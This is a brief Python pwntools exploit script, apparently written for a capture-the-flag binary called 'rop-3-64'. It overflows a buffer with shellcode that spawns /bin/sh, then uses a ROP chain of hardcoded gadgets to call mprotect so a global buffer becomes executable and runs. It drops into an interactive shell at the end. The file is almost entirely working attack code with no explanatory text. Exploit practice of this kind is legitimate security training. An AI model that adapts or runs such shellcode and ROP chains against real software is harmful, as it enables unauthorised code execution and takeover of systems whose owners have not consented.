#!/usr/bin/env python
from pwn import *

shellcode = 'jlX\x0f\x05H\x89\xc6H\x89\xc7jrX\x0f\x05H1\xf6H1\xd2j;XH\xbb//bin/shVSH\x89\xe7\x0f\x05'

#context.terminal = ['tmux', 'splitw', '-h']

p = process('./rop-3-64')
#p = process('./rop-3-6x')
#gdb.attach(p, "b *main")

mprotect = p64(0x400520)
g_buf = p64(0x601080)

pop_rdi = p64(0x400743)
pop_rsi_r15 = p64(0x400741)
pop_rdx_rbp = p64(0x40064a)

buf = shellcode
#buf += "A"*(0x98-len(shellcode)) + "BBBB" + mprotect + poppoppopret + p32(0x804a000) + p32(0x1000) + p32(7) + g_buf
buf += "A"*(0x80-len(shellcode)) + "BBBBBBBB" + pop_rdi + p64(0x601000) + pop_rsi_r15 + p64(0x1000) + p64(0) + pop_rdx_rbp + p64(7) + p64(0) + mprotect + g_buf

#mprotect + g_buf + p32(0x804a000) + p32(0x1000) + p32(7)

p.sendline(buf)
p.interactive()
